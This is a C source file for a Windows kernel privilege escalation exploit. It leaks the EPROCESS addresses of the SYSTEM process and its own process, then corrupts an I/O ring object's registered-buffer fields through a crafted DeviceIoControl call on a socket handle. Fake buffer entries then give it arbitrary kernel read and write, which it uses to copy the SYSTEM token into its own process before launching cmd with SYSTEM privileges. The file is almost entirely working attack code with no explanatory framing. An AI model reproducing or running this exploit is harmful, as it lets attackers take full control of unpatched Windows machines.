#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <tchar.h>
#include <ioringapi.h>
#include "Header.h"
#include <ntstatus.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "ntdll.lib")

#define NAMEDPIPEREAD TEXT("\\\\.\\pipe\\namedpiperead") 
#define NAMEDPIPEWRITE TEXT("\\\\.\\pipe\\namedpipewrite") 


extern "C" NTSTATUS __stdcall NtCreateIoCompletion(
	PHANDLE IoCompletionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	DWORD NumberOfConcurrentThreads
);

extern "C" NTSTATUS __stdcall NtSetIoCompletion(
	HANDLE IoCompletionHandle,
	UINT_PTR KeyContext,
	UINT_PTR ApcContext,
	UINT_PTR Status,
	UINT_PTR IoStatusInformation
);

typedef struct
{
	long long handle;
	long long field8;
	long long field10;
	long long address;
	int field20;
	int field24;
	int field28;
	int field2c;
}cve;


HIORING GetIORingHandle()
{
	HIORING hIORing = NULL;
	HRESULT hResult;
	IORING_CREATE_FLAGS flags;

	flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
	flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;

	hResult = CreateIoRing(IORING_VERSION_3,
		flags,
		0x10000, // submissiongqueueSize
		0x20000, // CompletionQueueSize
		&hIORing);
	if (hResult != S_OK)
	{
		puts("[-]Create IORing failed");
		exit(-1);
	}
	return hIORing;
}

ULONGLONG GetIORingObject(HANDLE hIORing)
{
	ULONGLONG Address = 0;
	NTSTATUS status;
	struct {
		OBJECT_TYPE_INFORMATION TypeInfo;
		char name[0x10];
	} ObjectType;
	PSYSTEM_HANDLE_INFORMATION HandleInfo;
	ULONG typeIndex;

	status = NtQueryObject((HANDLE)hIORing,
		ObjectTypeInformation,
		&ObjectType,
		sizeof(ObjectType),
		NULL);

	if (!NT_SUCCESS(status))
	{
		printf("NtQueryObject failed: 0x%x\n", status);
		//puts("[-]NtQueryObject failed");
		exit(-1);
	}

	typeIndex = ObjectType.TypeInfo.TypeIndex;

	HandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(1024 * 1024 * 2);

	status = NtQuerySystemInformation(SystemHandleInformation,
		HandleInfo,
		1024 * 1024 * 2,
		NULL);

	if (!NT_SUCCESS(status))
	{
		printf("NtQuerySystemInformation failed: 0x%x\n", status);
		//puts("[-]NtQuerySystemInformation failed");
		exit(-1);
	}

	for (int i = 0; i < HandleInfo->NumberOfHandles; i++)
	{
		if (HandleInfo->Handles[i].ObjectTypeIndex == typeIndex &&
			HandleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() &&
			(HIORING)HandleInfo->Handles[i].HandleValue == hIORing)
		{
			printf("[+]Found IORing object: %p\n", HandleInfo->Handles[i].Object);
			Address = (ULONGLONG)HandleInfo->Handles[i].Object;
			break;
		}
	}
	free(HandleInfo);
	return Address;
}

void CreateNamedPipeReadWrite(HANDLE* readNp, HANDLE* writeNp)
{
	HANDLE tmpH;
	tmpH = CreateNamedPipe(NAMEDPIPEREAD,
		PIPE_ACCESS_DUPLEX | PIPE_ACCESS_OUTBOUND,
		PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		0x1000,
		0x1000,
		0,
		NULL);
	if (tmpH == INVALID_HANDLE_VALUE)
	{
		puts("[-]Create namedpipe read failed");
		exit(-1);
	}
	*readNp = tmpH;

	tmpH = CreateNamedPipe(NAMEDPIPEWRITE,
		PIPE_ACCESS_DUPLEX | PIPE_ACCESS_OUTBOUND,
		PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		0x1000,
		0x1000,
		0,
		NULL);
	if (tmpH == INVALID_HANDLE_VALUE)
	{
		puts("[-]Create namedpipe write failed");
		exit(-1);
	}
	*writeNp = tmpH;
}

void CreateNamedpipeClientReadWrite(HANDLE* npRead, HANDLE* npWrite)
{
	HANDLE hTmp;
	hTmp = CreateFile(NAMEDPIPEREAD,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hTmp == INVALID_HANDLE_VALUE)
	{
		puts("[-]Cannot create read client pipe");
		exit(-1);
	}
	*npRead = hTmp;

	hTmp = CreateFile(NAMEDPIPEWRITE,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hTmp == INVALID_HANDLE_VALUE)
	{
		puts("[-]Cannot create write client pipe");
		exit(-1);
	}
	*npWrite = hTmp;
}

int SetupBufferEntry(PIOP_MC_BUFFER_ENTRY* BufferArray,
	ULONGLONG targetAddress,
	int Size)
{
	PIOP_MC_BUFFER_ENTRY tmpEntry;
	int index;

	tmpEntry = (PIOP_MC_BUFFER_ENTRY)malloc(sizeof(IOP_MC_BUFFER_ENTRY));
	if (!tmpEntry)
	{
		puts("[-]Cannot create new entry");
		exit(-1);
	}
	memset(tmpEntry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
	tmpEntry->Address = (PVOID)targetAddress;
	tmpEntry->Length = Size;
	tmpEntry->Type = 0xc02;
	tmpEntry->Size = 0x80;
	tmpEntry->AccessMode = 1;
	tmpEntry->ReferenceCount = 1;

	//find first empty entry in array
	index = 0;
	while (1)
	{
		if (!BufferArray[index])
		{
			BufferArray[index] = tmpEntry;
			return index;
		}
		index++;
	}

}

int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
{
	int ret = -1;
	PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
	ULONG ulBytes = 0;
	NTSTATUS ntStatus = STATUS_SUCCESS;

	while ((ntStatus = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (pHandleInfo != NULL)
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
		}

		else
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (ntStatus != STATUS_SUCCESS)
	{
		ret = ntStatus;
		goto done;
	}

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
	{
		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == (unsigned short)handle))
		{
			*ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
			ret = 0;
			break;
		}
	}

done:
	if (NULL != pHandleInfo)
	{
		HeapFree(GetProcessHeap, 0, pHandleInfo);
	}
	return ret;
}

void ReadKernelData(HANDLE npRead, void* out, int size)
{
	BOOL returnValue;
	int bytesRead;
	returnValue = ReadFile(npRead,
		out,
		size,
		(LPDWORD)&bytesRead,
		NULL);
	if (returnValue == 0)
	{
		puts("[-]Readfile failed");
		exit(-1);
	}
}



int main()
{
	WSADATA wsaData;
	int iResult, indexBuf;
	SOCKET s;
	cve* inBuf;
	HANDLE ioCompletion, npReadServer, npWriteServer, npReadClient, npWriteClient;
	NTSTATUS status;
	HIORING hIORing;
	_HIORING *phIORing;
	PIORING_OBJECT IORingObject;
	PIOP_MC_BUFFER_ENTRY* fakeBufferEntry;
	IORING_HANDLE_REF HandleRef = IoRingHandleRefFromHandle(0);
	IORING_BUFFER_REF BufferRef = IoRingBufferRefFromIndexAndOffset(0, 0);
	HRESULT hResult;
	UINT32 submittedEntries;
	void* BufferLeak;
	ULONG64 systemEprocess, targetEprocess, TOKEN;
	HANDLE hProc;

	hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());

	iResult = getobjptr(&systemEprocess, 4, (HANDLE)4);
	if (iResult != 0)
	{
		puts("[-]Leak system eprocess failed");
		exit(-1);
	}

	printf("[+]System: %p\n", systemEprocess);

	iResult = getobjptr(&targetEprocess, GetCurrentProcessId(), hProc);
	if (iResult != 0)
	{
		puts("[-]Leak target eprocess failed");
		exit(-1);
	}

	printf("[+]Target: %p\n", targetEprocess);

	hIORing = GetIORingHandle();
	//printf("[+]IORing handle: %p\n", hIORing);
	IORingObject = (PIORING_OBJECT)GetIORingObject(*(HANDLE*)hIORing);

	fakeBufferEntry = (PIOP_MC_BUFFER_ENTRY*)VirtualAlloc((LPVOID)0x1000000,
		sizeof(ULONGLONG) * 0x100,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);
	if ((ULONGLONG)fakeBufferEntry != 0x1000000)
	{
		puts("[-]Cannot allocate 0x1000000 chunk");
		exit(-1);
	}
	printf("[+]Fake buffer: %p\n", fakeBufferEntry);

	memset(fakeBufferEntry, 0, sizeof(ULONGLONG) * 0x100);



	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("[-]WSAStartup failed: %d\n", iResult);
		return 1;
	}

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
	{
		puts("[-]Create socket failed");
		exit(-1);
	}


	inBuf = (cve*)malloc(0x30);
	memset(inBuf, 0, 0x30);
	inBuf->field20 = 1;

	NtCreateIoCompletion(&ioCompletion, IO_COMPLETION_ALL_ACCESS, NULL, 0);
	status = NtSetIoCompletion(ioCompletion, 0x12345678, 0x9ABCDEF0, 0x11111111, 0x22222222);
	if (!NT_SUCCESS(status))
	{
		printf("Error setting IO Completion: %08X\n", status);
		return 1;
	}
	inBuf->handle = (long long)ioCompletion;
	inBuf->field8 = (long long)malloc(0x40);
	inBuf->field28 = 0x1;
	inBuf->address = (long long)&IORingObject->RegBuffers + 3;
	//inBuf->address = (long long)0x1000000;
	inBuf->field10 = (long long)malloc(512);
	DeviceIoControl((HANDLE)s, 0x12127, inBuf, 0x30, NULL, NULL, NULL, NULL);



	NtCreateIoCompletion(&ioCompletion, IO_COMPLETION_ALL_ACCESS, NULL, 0);
	status = NtSetIoCompletion(ioCompletion, 0x12345678, 0x9ABCDEF0, 0x11111111, 0x22222222);
	if (!NT_SUCCESS(status))
	{
		printf("Error setting IO Completion: %08X\n", status);
		return 1;
	}
	inBuf->handle = (long long)ioCompletion;
	inBuf->field8 = (long long)malloc(0x40);
	inBuf->field28 = 0x1;
	inBuf->field10 = (long long)malloc(512);
	inBuf->address = (long long)&IORingObject->RegBuffersCount + 1;
	DeviceIoControl((HANDLE)s, 0x12127, inBuf, 0x30, NULL, NULL, NULL, NULL);

	CreateNamedPipeReadWrite(&npReadServer, &npWriteServer);
	CreateNamedpipeClientReadWrite(&npReadClient, &npWriteClient);

	indexBuf = SetupBufferEntry(fakeBufferEntry, (ULONGLONG)systemEprocess + 0x4b8, 8);
	HandleRef = IoRingHandleRefFromHandle(npReadClient);
	BufferRef = IoRingBufferRefFromIndexAndOffset(indexBuf, 0);


	//change the kernelbase struct so that those ioring functions can work
	phIORing = *(_HIORING**)&hIORing;
	phIORing->BufferArraySize = 0x100;
	phIORing->RegBufferArray = fakeBufferEntry;


	hResult = BuildIoRingWriteFile(hIORing,
		HandleRef,
		BufferRef,
		0x8,
		0,
		FILE_WRITE_FLAGS_NONE,
		NULL,
		IOSQE_FLAGS_NONE);

	if (hResult != S_OK)
	{
		puts("[-]Build ioring for read failed");
		exit(-1);
	}

	//puts("Enter to submit");
	//scanf_s("%d", &iResult);
	hResult = SubmitIoRing(hIORing, 0, 0, &submittedEntries);
	if (!SUCCEEDED(hResult))
	{
		puts("[-]Submir ioring failed");
		exit(-1);
	}

	//puts("Data leak:");
	BufferLeak = malloc(0x100);
	if (!BufferLeak)
	{
		puts("[-]Cannot allocate for buffer leak");
		exit(-1);
	}
	ReadKernelData(npReadServer, BufferLeak, 0x8);
	//for (int i = 0; i < 0x20; i += 8)
	//{
	//	printf("%p ", *((ULONGLONG*)BufferLeak + i));
	//}
	
	TOKEN = *(PULONG64)BufferLeak;
	printf("[+]Token: %p\n", TOKEN);


	indexBuf = SetupBufferEntry(fakeBufferEntry, (ULONGLONG)targetEprocess + 0x4b8, 8);
	HandleRef = IoRingHandleRefFromHandle(npWriteClient);
	BufferRef = IoRingBufferRefFromIndexAndOffset(indexBuf, 0);

	hResult = BuildIoRingReadFile(hIORing,
		HandleRef,
		BufferRef,
		0x8,
		0,
		NULL,
		IOSQE_FLAGS_NONE);

	if (hResult != S_OK)
	{
		puts("[-]Build ioring for write failed");
		exit(-1);
	}

	if (!WriteFile(npWriteServer, BufferLeak, 8, NULL, 0))
	{
		puts("[+]Writefile failed");
		exit(-1);
	}
	hResult = SubmitIoRing(hIORing, 0, 0, &submittedEntries);
	if (!SUCCEEDED(hResult))
	{
		puts("[-]Submir ioring failed");
		exit(-1);
	}


	//Clean up

	indexBuf = SetupBufferEntry(fakeBufferEntry, (ULONGLONG)&IORingObject->RegBuffersCount, 0x10);
	HandleRef = IoRingHandleRefFromHandle(npWriteClient);
	BufferRef = IoRingBufferRefFromIndexAndOffset(indexBuf, 0);

	hResult = BuildIoRingReadFile(hIORing,
		HandleRef,
		BufferRef,
		0x10,
		0,
		NULL,
		IOSQE_FLAGS_NONE);

	if (hResult != S_OK)
	{
		puts("[-]Build ioring for write failed");
		exit(-1);
	}

	memset(BufferLeak, 0, 0x100);
	if (!WriteFile(npWriteServer, BufferLeak, 0x10, NULL, 0))
	{
		puts("[+]Writefile failed");
		exit(-1);
	}
	hResult = SubmitIoRing(hIORing, 0, 0, &submittedEntries);
	if (!SUCCEEDED(hResult))
	{
		puts("[-]Submir ioring failed");
		exit(-1);
	}

	puts("Done");
	system("cmd");


	return 0;
}